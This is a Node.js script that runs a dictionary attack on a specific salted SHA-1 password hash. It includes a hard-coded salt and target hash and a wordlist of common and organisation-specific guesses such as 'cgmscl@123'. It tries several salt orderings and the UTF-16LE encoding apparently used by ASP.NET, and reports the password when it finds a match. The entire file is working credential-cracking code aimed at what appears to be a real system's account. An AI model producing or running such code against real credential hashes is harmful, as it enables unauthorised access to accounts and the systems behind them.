const crypto = require('crypto');

const salt = 'b7YyO3PC';
const targetHash = 'Ey/+oYZoKtiJPl0qKojOC7Uh7hc=';

// common passwords
const commonPasswords = [
    'admin', 'Admin', 'admin123', 'admin@123', 'password', '123456', '12345678',
    'cgmscl', 'CGMSCL', 'Cgmscl@123', 'cgmscl@123', 'facility', 'Facility',
    'test', 'Test', '12345', 'qwerty'
];

function tryHash(pass) {
    // Try various combinations of salt + pass
    
    // 1. salt + pass (UTF8)
    let h1 = crypto.createHash('sha1').update(salt + pass).digest('base64');
    if (h1 === targetHash) return pass;
    
    // 2. pass + salt (UTF8)
    let h2 = crypto.createHash('sha1').update(pass + salt).digest('base64');
    if (h2 === targetHash) return pass;

    // 3. UTF-16LE pass + salt etc (ASP.NET often uses UTF-16LE)
    let pass16 = Buffer.from(pass, 'utf16le');
    let saltBuf = Buffer.from(salt, 'base64'); // If salt is base64 encoded
    
    try {
        let h3 = crypto.createHash('sha1').update(Buffer.concat([saltBuf, pass16])).digest('base64');
        if (h3 === targetHash) return pass;
    } catch(e) {}
    
    try {
        let h4 = crypto.createHash('sha1').update(Buffer.concat([pass16, saltBuf])).digest('base64');
        if (h4 === targetHash) return pass;
    } catch(e) {}

    return null;
}

for (let p of commonPasswords) {
    let res = tryHash(p);
    if (res) {
        console.log("FOUND! Password is:", res);
        process.exit(0);
    }
}
console.log("Not in common list");
